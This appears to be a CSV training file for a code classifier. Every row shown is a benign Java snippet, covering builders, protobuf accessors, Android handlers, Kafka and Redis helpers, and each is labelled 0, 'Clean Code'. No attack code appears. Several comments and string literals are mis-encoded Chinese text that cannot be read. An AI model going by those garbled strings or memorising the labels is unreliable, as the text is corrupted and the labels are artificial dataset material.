text,label,text_label
"public Builder withInputImage(String inputImage){
  this.inputImage=inputImage;
  return this;
}
",0,Clean Code
"public static long fmix64(long k){
  k^=k >>> 33;
  k*=0xff51afd7ed558ccdL;
  k^=k >>> 33;
  k*=0xc4ceb9fe1a85ec53L;
  k^=k >>> 33;
  return k;
}",0,Clean Code
"String getPklVersion();
",0,Clean Code
"@Override public void changedVisibility(final IViewEdge<?> edge,final boolean visible){
  if (visible) {
    final Node source=m_sourceNode.getNode();
    final Node target=m_targetNode.getNode();
    if ((source.getGraph() == null) || (target.getGraph() == null)) {
      return;
    }
    final HierarchyManager hm=m_graph.getHierarchyManager();
    final Edge yedge=hm.createEdge(source,target);
    m_graph.setRealizer(yedge,m_realizer);
    m_edge=yedge;
  }
 else   if (m_edge.getGraph() == m_graph) {
    m_graph.removeEdge(m_edge);
  }
}
@Override public void changedVisibility(final ZyEdgeRealizer<EdgeTypeT> realizer){
  m_rawEdge.setVisible(realizer.isVisible());
}
",0,Clean Code
"@POST(""/api/show"") @Headers({""Content-Type: application/json""}) Call<OllamaModelCard> showInformation(@Body ShowModelInformationRequest modelDetailsRequest);
",0,Clean Code
"@Override public ChallengeStoryInfo clone(){
  return new ChallengeStoryInfo().copyFrom(this);
}
",0,Clean Code
"@Override public long getWorkflowCount(String query,String freeText){
  try {
    return getObjectCounts(query,freeText,WORKFLOW_DOC_TYPE);
  }
 catch (  Exception e) {
    throw new TransientException(e.getMessage(),e);
  }
}
",0,Clean Code
"/** 
 * <code>optional uint32 point_id = 12;</code>
 * @return whether the pointId field is set
 */
public boolean hasPointId(){
  return (bitField0_ & 0x00000008) != 0;
}",0,Clean Code
"@Override public SearchResult searchMod(SearchFilters searchFilters,SearchResult previousPageResult){
  CommonApiSearchResult commonApiSearchResult=(CommonApiSearchResult)previousPageResult;
  SearchResult[] results=commonApiSearchResult == null ? new SearchResult[mModpackApis.length] : commonApiSearchResult.searchResults;
  int totalSize=0;
  Future<?>[] futures=new Future<?>[mModpackApis.length];
  for (int i=0; i < mModpackApis.length; i++) {
    if (results[i] != null && results[i].results.length == 0)     continue;
    if (previousPageResult != null && results[i] == null)     continue;
    futures[i]=PojavApplication.sExecutorService.submit(new ApiDownloadTask(i,searchFilters,results[i]));
  }
  if (Thread.interrupted()) {
    cancelAllFutures(futures);
    return null;
  }
  boolean hasSuccessful=false;
  for (int i=0; i < mModpackApis.length; i++) {
    Future<?> future=futures[i];
    if (future == null)     continue;
    try {
      SearchResult searchResult=results[i]=(SearchResult)future.get();
      if (searchResult != null)       hasSuccessful=true;
 else       continue;
      totalSize+=searchResult.totalResultCount;
    }
 catch (    Exception e) {
      cancelAllFutures(futures);
      e.printStackTrace();
      return null;
    }
  }
  if (!hasSuccessful) {
    return null;
  }
  ArrayList<ModItem[]> filteredResults=new ArrayList<>(results.length);
  for (  SearchResult result : results) {
    if (result == null)     continue;
    ModItem[] searchResults=result.results;
    if (searchResults.length == 0)     continue;
    filteredResults.add(searchResults);
  }
  filteredResults.trimToSize();
  if (Thread.interrupted())   return null;
  ModItem[] concatenatedItems=buildFusedResponse(filteredResults);
  if (Thread.interrupted())   return null;
  if (commonApiSearchResult == null)   commonApiSearchResult=new CommonApiSearchResult();
  commonApiSearchResult.searchResults=results;
  commonApiSearchResult.totalResultCount=totalSize;
  commonApiSearchResult.results=concatenatedItems;
  return commonApiSearchResult;
}",0,Clean Code
"private Properties.Comment commentFromLine(String line,String prefix,Properties.Comment.Delimiter delimiter){
  StringBuilder prefixBuilder=new StringBuilder(prefix);
  StringBuilder message=new StringBuilder();
  boolean inComment=false;
  int state=0;
  for (  char c : line.toCharArray()) {
switch (state) {
case 0:
      if (Character.isWhitespace(c)) {
        prefixBuilder.append(c);
        break;
      }
    state++;
case 1:
  if ((c == '#' || c == '!') && !inComment) {
    inComment=true;
    continue;
  }
 else   if (!Character.isWhitespace(c)) {
    message.append(c);
    break;
  }
state++;
case 2:
if (!Character.isWhitespace(c)) {
message.append(c);
state--;
break;
}
 else {
message.append(c);
}
}
}
return new Properties.Comment(randomId(),prefixBuilder.toString(),Markers.EMPTY,delimiter,message.toString());
}",0,Clean Code
"public abstract void onOptionsItemSelected(MenuItem menuItem);
",0,Clean Code
"@Override @TruffleBoundary public void describe(StringBuilder builder,String indent){
  describeSummary(builder,indent);
  describeDetails(builder,indent);
}
",0,Clean Code
"/** 
 * 鑾峰彇鍙傛暟鏁版嵁 渚嬪: getParam(""token=xx;Identifier=xxx;"", ""token""); 杩斿洖: xx
 * @param d         琚煡鎵剧殑鏁版嵁
 * @param paramName 瑕佹煡鎵剧殑瀛楁
 * @return
 */
public static String getParam(final String d,final String paramName){
  if (d == null || d.length() == 0)   return null;
  String value=""test=test;"" + d;
  final int length=value.length();
  int start=value.indexOf(';') + 1;
  if (start == 0 || start == length)   return null;
  int end=value.indexOf(';',start);
  if (end == -1)   end=length;
  while (start < end) {
    int nameEnd=value.indexOf('=',start);
    if (nameEnd != -1 && nameEnd < end && paramName.equals(value.substring(start,nameEnd).trim())) {
      String paramValue=value.substring(nameEnd + 1,end).trim();
      int valueLength=paramValue.length();
      if (valueLength != 0)       if (valueLength > 2 && '""' == paramValue.charAt(0) && '""' == paramValue.charAt(valueLength - 1))       return paramValue.substring(1,valueLength - 1);
 else       return paramValue;
    }
    start=end + 1;
    end=value.indexOf(';',start);
    if (end == -1)     end=length;
  }
  return null;
}",0,Clean Code
"private void loadFromStart(int selectedType){
  int type;
  if (selectedType == 0) {
    type=MEDIA_PHOTOVIDEO;
    if (sharedMediaData[0].filterType == FILTER_PHOTOS_ONLY) {
      type=MediaDataController.MEDIA_PHOTOS_ONLY;
    }
 else     if (sharedMediaData[0].filterType == FILTER_VIDEOS_ONLY) {
      type=MediaDataController.MEDIA_VIDEOS_ONLY;
    }
  }
 else   if (selectedType == 1) {
    type=MediaDataController.MEDIA_FILE;
  }
 else   if (selectedType == 2) {
    type=MediaDataController.MEDIA_AUDIO;
  }
 else   if (selectedType == 4) {
    type=MediaDataController.MEDIA_MUSIC;
  }
 else   if (selectedType == 5) {
    type=MediaDataController.MEDIA_GIF;
  }
 else {
    type=MediaDataController.MEDIA_URL;
  }
  sharedMediaData[selectedType].loading=true;
  profileActivity.getMediaDataController().loadMedia(dialog_id,50,0,sharedMediaData[selectedType].min_id,type,topicId,1,profileActivity.getClassGuid(),sharedMediaData[selectedType].requestIndex);
}",0,Clean Code
"public static LocalDate toLocalDate(Object obj){
  if (obj == null) {
    return null;
  }
  if (obj instanceof LocalDate) {
    return (LocalDate)obj;
  }
  if (obj instanceof LocalDateTime) {
    return ((LocalDateTime)obj).toLocalDate();
  }
  if (obj instanceof java.sql.Date) {
    return ((java.sql.Date)obj).toLocalDate();
  }
  if (obj instanceof java.sql.Time) {
    throw new IllegalArgumentException(""Unable to convert to LocalDate from a java.sql.Time value '"" + obj + ""'"");
  }
  if (obj instanceof java.util.Date) {
    java.util.Date date=(java.util.Date)obj;
    return LocalDate.of(date.getYear() + 1900,date.getMonth() + 1,date.getDate());
  }
  if (obj instanceof Long) {
    return LocalDate.ofEpochDay((Long)obj);
  }
  if (obj instanceof Integer) {
    return LocalDate.ofEpochDay((Integer)obj);
  }
  throw new IllegalArgumentException(""Unable to convert to LocalDate from unexpected value '"" + obj + ""' of type ""+ obj.getClass().getName());
}",0,Clean Code
"/** 
 * 鍒ゆ柇绫诲瀷鏄惁鍏煎
 * @param base
 * @param target
 * @return
 */
private static boolean judgeTypeMatch(Class base,Class target){
  if (base.isAssignableFrom(target)) {
    return true;
  }
  if (base == int.class) {
    return target == Integer.class;
  }
 else   if (base == Integer.class) {
    return target == int.class;
  }
 else   if (base == long.class) {
    return target == Long.class;
  }
 else   if (base == Long.class) {
    return target == long.class;
  }
 else   if (base == float.class) {
    return target == Float.class;
  }
 else   if (base == Float.class) {
    return target == float.class;
  }
 else   if (base == double.class) {
    return target == Double.class;
  }
 else   if (base == Double.class) {
    return target == double.class;
  }
 else   if (base == boolean.class) {
    return target == Boolean.class;
  }
 else   if (base == Boolean.class) {
    return target == boolean.class;
  }
 else   if (base == char.class) {
    return target == Character.class;
  }
 else   if (base == Character.class) {
    return target == char.class;
  }
 else   if (base == byte.class) {
    return target == Byte.class;
  }
 else   if (base == Byte.class) {
    return target == byte.class;
  }
 else   if (base == short.class) {
    return target == Short.class;
  }
 else   if (base == Short.class) {
    return target == short.class;
  }
 else {
    return false;
  }
}
",0,Clean Code
"@Override public void cancel(WorkflowModel workflow,TaskModel task,WorkflowExecutor executor){
  task.setStatus(TaskModel.Status.CANCELED);
}
",0,Clean Code
"protected Object convertTimeValue(Time value,String type) throws Throwable {
  if (DataType.TIME.equals(type) || DataType.UNKNOWN.equals(type))   return value;
  if (value == null)   return null;
  if (DataType.STRING.equals(type))   return this._timeFormat.format(value);
 else   if (DataType.NUMBER.equals(type))   return value.getTime();
 else   if (DataType.INTEGER.equals(type))   return value.getTime();
 else   if (DataType.DECIMAL.equals(type))   return value.getTime();
 else   if (DataType.DATE.equals(type))   return new Date(value.getTime());
 else   if (DataType.TIMESTAMP.equals(type))   return new Timestamp(value.getTime());
 else   throw new DataValueConvertionException(value,type);
}
",0,Clean Code
"public IDanmakuFilter<?> registerFilter(String tag){
  return registerFilter(tag,true);
}
public IDanmakuFilter<?> registerFilter(String tag,boolean primary){
  if (tag == null) {
    throwFilterException();
    return null;
  }
  IDanmakuFilter<?> filter=filters.get(tag);
  if (filter == null) {
    if (TAG_TYPE_DANMAKU_FILTER.equals(tag)) {
      filter=new TypeDanmakuFilter();
    }
 else     if (TAG_QUANTITY_DANMAKU_FILTER.equals(tag)) {
      filter=new QuantityDanmakuFilter();
    }
 else     if (TAG_ELAPSED_TIME_FILTER.equals(tag)) {
      filter=new ElapsedTimeFilter();
    }
 else     if (TAG_TEXT_COLOR_DANMAKU_FILTER.equals(tag)) {
      filter=new TextColorFilter();
    }
 else     if (TAG_USER_ID_FILTER.equals(tag)) {
      filter=new UserIdFilter();
    }
 else     if (TAG_USER_HASH_FILTER.equals(tag)) {
      filter=new UserHashFilter();
    }
 else     if (TAG_GUEST_FILTER.equals(tag)) {
      filter=new GuestFilter();
    }
 else     if (TAG_DUPLICATE_FILTER.equals(tag)) {
      filter=new DuplicateMergingFilter();
    }
 else     if (TAG_MAXIMUN_LINES_FILTER.equals(tag)) {
      filter=new MaximumLinesFilter();
    }
 else     if (TAG_OVERLAPPING_FILTER.equals(tag)) {
      filter=new OverlappingFilter();
    }
  }
  if (filter == null) {
    throwFilterException();
    return null;
  }
  filter.setData(null);
  if (primary) {
    filters.put(tag,filter);
    mFilterArray=filters.values().toArray(mFilterArray);
  }
 else {
    filtersSecondary.put(tag,filter);
    mFilterArraySecondary=filtersSecondary.values().toArray(mFilterArraySecondary);
  }
  return filter;
}
public void registerFilter(BaseDanmakuFilter filter){
  filters.put(TAG_PRIMARY_CUSTOM_FILTER + ""_"" + filter.hashCode(),filter);
  mFilterArray=filters.values().toArray(mFilterArray);
}
",0,Clean Code
"/** 
 * Generate options for kafka connector
 * @return options
 */
@Override public Map<String,String> tableOptions(){
  Map<String,String> options=super.tableOptions();
  options.put(TOPIC,topic);
  options.put(PROPERTIES_BOOTSTRAP_SERVERS,bootstrapServers);
  if (getSinkParallelism() != null) {
    options.put(SINK_PARALLELISM,getSinkParallelism().toString());
  }
  if (format instanceof JsonFormat || format instanceof AvroFormat || format instanceof CsvFormat|| format instanceof RawFormat) {
    if (StringUtils.isEmpty(this.primaryKey)) {
      options.put(CONNECTOR,KAFKA);
      options.put(SINK_IGNORE_CHANGELOG,""true"");
      options.putAll(format.generateOptions(false));
    }
 else {
      options.put(CONNECTOR,UPSERT_KAFKA);
      options.putAll(format.generateOptions(true));
    }
    if (format instanceof RawFormat) {
      if (sinkMultipleFormat != null) {
        options.put(SINK_MULTIPLE_FORMAT,sinkMultipleFormat.identifier());
      }
      if (StringUtils.isNotBlank(topicPattern)) {
        options.put(TOPIC_PATTERN,topicPattern);
      }
      if (StringUtils.isNotBlank(sinkPartitioner)) {
        options.put(SINK_PARTITIONER,sinkPartitioner);
      }
      if (StringUtils.isNotBlank(partitionPattern)) {
        options.put(SINK_MULTIPLE_PARTITION_PATTERN,partitionPattern);
      }
    }
  }
 else   if (format instanceof CanalJsonFormat || format instanceof DebeziumJsonFormat) {
    options.put(CONNECTOR,KAFKA);
    options.putAll(format.generateOptions(false));
  }
 else {
    throw new IllegalArgumentException(""kafka load Node format is IllegalArgument"");
  }
  return options;
}
",0,Clean Code
"@Override public void intercept(HttpRequest httpRequest){
  this.log(httpRequest);
}
",0,Clean Code
"public long getSrcTinyId(){
  return this.srcTinyId;
}
",0,Clean Code
"/** 
 * <code>repeated uint32 unlocked_teleport_list = 8;</code>
 * @param value the unlockedTeleportList to add
 * @return this
 */
public GetUnlockTeleportScRsp addUnlockedTeleportList(final int value){
  bitField0_|=0x00000002;
  unlockedTeleportList.add(value);
  return this;
}",0,Clean Code
"private FinishRogueDialogueGroupCsReq(){
}
",0,Clean Code
"@Override public View onFocusSearch(View focused,int direction){
  if (mCanShowHeaders && isInHeadersTransition()) {
    return focused;
  }
  if (DEBUG)   Log.v(TAG,""onFocusSearch focused "" + focused + "" + direction ""+ direction);
  if (getTitleView() != null && focused != getTitleView() && direction == View.FOCUS_UP) {
    return getTitleView();
  }
  if (getTitleView() != null && getTitleView().hasFocus() && direction == View.FOCUS_DOWN) {
    return mCanShowHeaders && mShowingHeaders ? mHeadersSupportFragment.getVerticalGridView() : mMainFragment.getView();
  }
  boolean isRtl=ViewCompat.getLayoutDirection(focused) == ViewCompat.LAYOUT_DIRECTION_RTL;
  int towardStart=isRtl ? View.FOCUS_RIGHT : View.FOCUS_LEFT;
  int towardEnd=isRtl ? View.FOCUS_LEFT : View.FOCUS_RIGHT;
  if (mCanShowHeaders && direction == towardStart) {
    if (isVerticalScrolling() || mShowingHeaders || !isHeadersDataReady()) {
      return focused;
    }
    return mHeadersSupportFragment.getVerticalGridView();
  }
 else   if (direction == towardEnd) {
    if (isVerticalScrolling()) {
      return focused;
    }
 else     if (mMainFragment != null && mMainFragment.getView() != null) {
      return mMainFragment.getView();
    }
    return focused;
  }
 else   if (direction == View.FOCUS_DOWN && mShowingHeaders) {
    return focused;
  }
 else {
    return null;
  }
}
",0,Clean Code
"public static List<FriendWatch> getList(){
  ArrayList<FriendWatch> list=new ArrayList<>();
  String strFriendWatch=FileUtils.readFromFile(FileUtils.getFriendWatchFile());
  try {
    JSONObject joFriendWatch;
    if (StringUtil.isEmpty(strFriendWatch)) {
      joFriendWatch=new JSONObject();
    }
 else {
      joFriendWatch=new JSONObject(strFriendWatch);
    }
    for (    String id : FriendIdMap.getFriendIds()) {
      JSONObject friend=joFriendWatch.optJSONObject(id);
      if (friend == null) {
        friend=new JSONObject();
      }
      String name=FriendIdMap.getNameById(id);
      FriendWatch friendWatch=new FriendWatch(id,name);
      friendWatch.startTime=friend.optString(""startTime"",""鏃�"");
      friendWatch.weekGet=friend.optInt(""weekGet"",0);
      friendWatch.allGet=friend.optInt(""allGet"",0) + friendWatch.weekGet;
      String showText=name + ""(寮�濮嬬粺璁℃椂闂�:"" + friendWatch.startTime+ "")\n\n"";
      showText=showText + ""鍛ㄦ敹:"" + friendWatch.weekGet+ "" 鎬绘敹:""+ friendWatch.allGet;
      friendWatch.name=showText;
      list.add(friendWatch);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""FriendWatch getList: "");
    Log.printStackTrace(TAG,t);
  }
  return list;
}",0,Clean Code
"public void didSelectSearchPhotos(ArrayList<SendMessagesHelper.SendingMediaInfo> photos,boolean notify,int scheduleDate){
  if (photos.isEmpty()) {
    return;
  }
  if (!checkSlowModeAlert()) {
    return;
  }
  boolean hasNoGifs=false;
  for (int a=0; a < photos.size(); a++) {
    SendMessagesHelper.SendingMediaInfo info=photos.get(a);
    if (info.inlineResult == null && info.videoEditedInfo == null) {
      hasNoGifs=true;
      break;
    }
  }
  if (!hasNoGifs && !TextUtils.isEmpty(photos.get(0).caption)) {
    SendMessagesHelper.getInstance(currentAccount).sendMessage(photos.get(0).caption,dialog_id,replyingMessageObject,getThreadMessage(),null,false,photos.get(0).entities,null,null,notify,scheduleDate,null,false);
  }
  for (int a=0; a < photos.size(); a++) {
    SendMessagesHelper.SendingMediaInfo info=photos.get(a);
    if (info.inlineResult != null && info.videoEditedInfo == null) {
      SendMessagesHelper.prepareSendingBotContextResult(this,getAccountInstance(),info.inlineResult,info.params,dialog_id,replyingMessageObject,getThreadMessage(),notify,scheduleDate);
      photos.remove(a);
      a--;
    }
  }
  if (photos.isEmpty()) {
    return;
  }
  fillEditingMediaWithCaption(photos.get(0).caption,photos.get(0).entities);
  SendMessagesHelper.prepareSendingMedia(getAccountInstance(),photos,dialog_id,replyingMessageObject,getThreadMessage(),null,false,true,editingMessageObject,notify,scheduleDate,photos.get(0).updateStickersOrder);
  afterMessageSend();
  if (scheduleDate != 0) {
    if (scheduledMessagesCount == -1) {
      scheduledMessagesCount=0;
    }
    scheduledMessagesCount+=photos.size();
    updateScheduledInterface(true);
  }
}",0,Clean Code
"public static boolean isSimpleDataType(String type){
  if (type.equalsIgnoreCase(DATATYPE_STRING)) {
    return false;
  }
  if (type.equalsIgnoreCase(DATATYPE_SHORT)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_SHORT)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_INTEGER)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_INT)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_LONG)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_LONG)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_DOUBLE)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_DOUBLE)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_FLOAT)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_FLOAT)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_BYTE)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_BYTE)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_CHARACTER)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_CHAR)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_BOOLEAN)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_BOOLEAN)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_DATE)) {
    return false;
  }
  if (type.equalsIgnoreCase(DATATYPE_TIME)) {
    return false;
  }
  if (type.equalsIgnoreCase(DATATYPE_DATETIME)) {
    return false;
  }
  return false;
}
",0,Clean Code
"@Override public Long srem(final String key,final String... members){
  try {
    String member=members[0];
    String[] m=new String[members.length - 1];
    for (int idx=1; idx < members.length; ++idx) {
      m[idx - 1]=members[idx];
    }
    return redis.srem(key,member,m);
  }
 catch (  Exception e) {
    throw new JedisException(e);
  }
}",0,Clean Code
"public void generate(){
  ProtoGen generator=new ProtoGen(protoPackage,javaPackage,goPackage);
  try {
    generator.processPackage(sourceJar,sourcePackage);
    generator.writeMapper(mapperDir,mapperPackage);
    generator.writeProtos(protosDir);
  }
 catch (  IOException e) {
    System.err.printf(""protogen: failed with %s\n"",e);
  }
}
",0,Clean Code
"/** 
 * <code>optional .RogueVirtualItemInfo rogue_virtual_item_info = 4;</code>
 * @return whether the rogueVirtualItemInfo field is set
 */
public boolean hasRogueVirtualItemInfo(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"/** 
 * 鍦∕apper鏂囦欢涓坊鍔犱唬鐮佽妭鐐�
 * @param mapperPath mapper.xml鎵�鍦ㄧ殑浣嶇疆
 * @param elements   闇�瑕佹坊鍔犵殑鑺傜偣鍐呭
 */
public String addElementInMapper(String mapperPath,MapperElement... elements) throws IOException, DocumentException {
  File mapperFile=new File(mapperPath);
  if (!mapperFile.exists()) {
    throw new ServiceException(""XML鏂囦欢涓嶅瓨鍦細"" + mapperPath);
  }
  Document doc=reader.read(new FileInputStream(mapperFile));
  List<Node> mapperNodes=doc.getRootElement().content();
  List<Node> newNodes=Lists.newArrayList();
  for (  Node node : mapperNodes) {
    if (node instanceof Element) {
      boolean equals=false;
      Element oldEle=(Element)node;
      for (      MapperElement newEle : elements) {
        if (!Strings.isNullOrEmpty(newEle.getId()) && newEle.getId().equals(oldEle.attributeValue(""id""))) {
          equals=true;
          newEle.setExisted(true);
        }
      }
      if (!equals) {
        newNodes.add(node);
      }
    }
 else {
      newNodes.add(node);
    }
  }
  for (  MapperElement ele : elements) {
    System.out.println(ele.getContent().trim());
    Element newEle=DocumentHelper.parseText(ele.getContent().trim()).getRootElement();
    if (ele.getLocation().equals(ElementPosition.FIRST)) {
      newNodes.add(0,newEle);
      if (!ele.isExisted()) {
        newNodes.add(0,new DOMComment(ele.getComment()));
      }
    }
 else {
      if (!ele.isExisted()) {
        newNodes.add(new DOMComment(ele.getComment()));
      }
      newNodes.add(newEle);
    }
  }
  doc.getRootElement().setContent(newNodes);
  XMLWriter writer=new XMLWriter(new FileWriter(mapperFile),format);
  writer.write(doc);
  writer.flush();
  return doc.getRootElement().attributeValue(""namespace"");
}",0,Clean Code
"private void handleIntent(Intent intent){
  String action=null;
  if (intent != null) {
    action=intent.getAction();
  }
  if (action == null) {
    checkStopSelf();
    return;
  }
switch (action) {
case ACTION_CLEAR:
    clear();
  break;
case ACTION_DELETE_RANGE:
LongList gidList=intent.getParcelableExtra(KEY_GID_LIST);
if (gidList != null && mDownloadManager != null) {
mDownloadManager.deleteRangeDownload(gidList);
}
break;
case ACTION_DELETE:
long gid=intent.getLongExtra(KEY_GID,-1);
if (gid != -1 && mDownloadManager != null) {
mDownloadManager.deleteDownload(gid);
}
break;
case ACTION_STOP_ALL:
if (mDownloadManager != null) {
mDownloadManager.stopAllDownload();
}
break;
case ACTION_STOP_RANGE:
LongList gidListS=intent.getParcelableExtra(KEY_GID_LIST);
if (gidListS != null && mDownloadManager != null) {
mDownloadManager.stopRangeDownload(gidListS);
}
break;
case ACTION_STOP_CURRENT:
if (mDownloadManager != null) {
mDownloadManager.stopCurrentDownload();
}
break;
case ACTION_STOP:
long gidS=intent.getLongExtra(KEY_GID,-1);
if (gidS != -1 && mDownloadManager != null) {
mDownloadManager.stopDownload(gidS);
}
break;
case ACTION_START_ALL:
if (mDownloadManager != null) {
mDownloadManager.startAllDownload();
}
break;
case ACTION_START_RANGE:
LongList gidListSR=intent.getParcelableExtra(KEY_GID_LIST);
if (gidListSR != null && mDownloadManager != null) {
mDownloadManager.startRangeDownload(gidListSR);
}
break;
case ACTION_START:
GalleryInfo gi=intent.getParcelableExtra(KEY_GALLERY_INFO);
String label=intent.getStringExtra(KEY_LABEL);
if (gi != null && mDownloadManager != null) {
mDownloadManager.startDownload(gi,label);
}
break;
}
checkStopSelf();
}",0,Clean Code
"public void setupBuffer(){
switch (bufferType) {
case array:
    buffer=MemoryUtils.buffer(1024 * 512);
  break;
case directBuffer:
buffer=MemoryUtils.wrap(ByteBuffer.allocateDirect(1024 * 512));
break;
}
}",0,Clean Code
"private void endYamlSequence(boolean isEmpty){
  var hasEnclosingSequence=hasEnclosingSequence();
  if (isEmpty) {
    if (hasEnclosingSequence) {
      builder.append(""[]"");
    }
 else {
      undoStartNewLine();
      builder.append("" []"");
    }
  }
  if (hasEnclosingSequence) {
    decreaseIndent();
  }
}
",0,Clean Code
"@Override public Relic create(){
  return Relic.newInstance();
}
",0,Clean Code
"@Override protected void startSet(VmSet value){
  doBeginArray();
}
",0,Clean Code
"/** 
 * <code>optional .RogueActionResultData rogue_action = 5;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RogueActionResultDataOuterClass.RogueActionResultData getMutableRogueAction(){
  bitField0_|=0x00000002;
  return rogueAction;
}",0,Clean Code
"/** 
 * Returns an expression that deserialize <code>mapData</code> as a java map. 
 */
protected Expression deserializeForMap(Expression mapData,TypeRef<?> typeRef){
  Expression javaMap=newMap(typeRef);
  @SuppressWarnings(""unchecked"") TypeRef<?> supertype=((TypeRef<? extends Map<?,?>>)typeRef).getSupertype(Map.class);
  TypeRef<?> keySetType=supertype.resolveType(TypeUtils.KEY_SET_RETURN_TYPE);
  TypeRef<?> keysType=TypeUtils.getCollectionType(keySetType);
  TypeRef<?> valuesType=supertype.resolveType(TypeUtils.VALUES_RETURN_TYPE);
  Expression keyArray=new Invoke(mapData,""keyArray"",binaryArrayTypeToken,false);
  Expression valueArray=new Invoke(mapData,""valueArray"",binaryArrayTypeToken,false);
  Expression keyJavaArray;
  Expression valueJavaArray;
  if (TypeUtils.ITERABLE_TYPE.isSupertypeOf(keysType)) {
    keyJavaArray=deserializeForCollection(keyArray,keysType);
  }
 else {
    keyJavaArray=deserializeForArray(keyArray,keysType);
  }
  if (TypeUtils.ITERABLE_TYPE.isSupertypeOf(valuesType)) {
    valueJavaArray=deserializeForCollection(valueArray,valuesType);
  }
 else {
    valueJavaArray=deserializeForArray(valueArray,valuesType);
  }
  ZipForEach put=new ZipForEach(keyJavaArray,valueJavaArray,(i,key,value) -> new If(ExpressionUtils.notNull(key),new Invoke(javaMap,""put"",key,value)));
  return new ListExpression(javaMap,put,javaMap);
}
",0,Clean Code
"@Override public List<AppraisalSurveyVO> appraisalSurvey(String status){
  List<HrmAchievementAppraisal> achievementAppraisals;
  String one=""1"";
  if (one.equals(status)) {
    achievementAppraisals=appraisalService.lambdaQuery().in(HrmAchievementAppraisal::getStatus,AppraisalStatus.FILLING_IN.getValue(),AppraisalStatus.UNDER_EVALUATION.getValue(),AppraisalStatus.CONFIRMING.getValue()).apply(""(start_time between subdate(now(),interval 1 year) and now() or end_time between subdate(now(),interval 1 year) and now() )"").list();
  }
 else {
    achievementAppraisals=appraisalService.lambdaQuery().eq(HrmAchievementAppraisal::getStatus,AppraisalStatus.ARCHIVE.getValue()).apply(""(start_time between subdate(now(),interval 1 year) and now() or end_time between subdate(now(),interval 1 year) and now() )"").list();
  }
  List<AppraisalSurveyVO> appraisalSurveyVOList=TransferUtil.transferList(achievementAppraisals,AppraisalSurveyVO.class);
  for (  AppraisalSurveyVO appraisalSurveyVO : appraisalSurveyVOList) {
    HrmAchievementTable achievementTable=achievementTableService.getById(appraisalSurveyVO.getTableId());
    appraisalSurveyVO.setTableName(achievementTable.getTableName());
    appraisalSurveyVO.setAppraisalTime(AchievementUtil.appraisalTimeFormat(appraisalSurveyVO.getStartTime(),appraisalSurveyVO.getEndTime()));
    List<AppraisalSurveyVO.ScoreLevelsBean> scoreLevels=new ArrayList<>();
    List<Map<String,Object>> mapList=employeeAppraisalMapper.queryScoreLevels(appraisalSurveyVO.getAppraisalId());
    mapList.forEach(map -> {
      scoreLevels.add(BeanUtil.toBean(map,AppraisalSurveyVO.ScoreLevelsBean.class));
    }
);
    appraisalSurveyVO.setScoreLevels(scoreLevels);
  }
  return appraisalSurveyVOList;
}",0,Clean Code
"@Override public <T,E extends Throwable>void onError(RetryContext context,RetryCallback<T,E> callback,Throwable throwable){
  onErrorRetryCount=context.getRetryCount();
}
",0,Clean Code
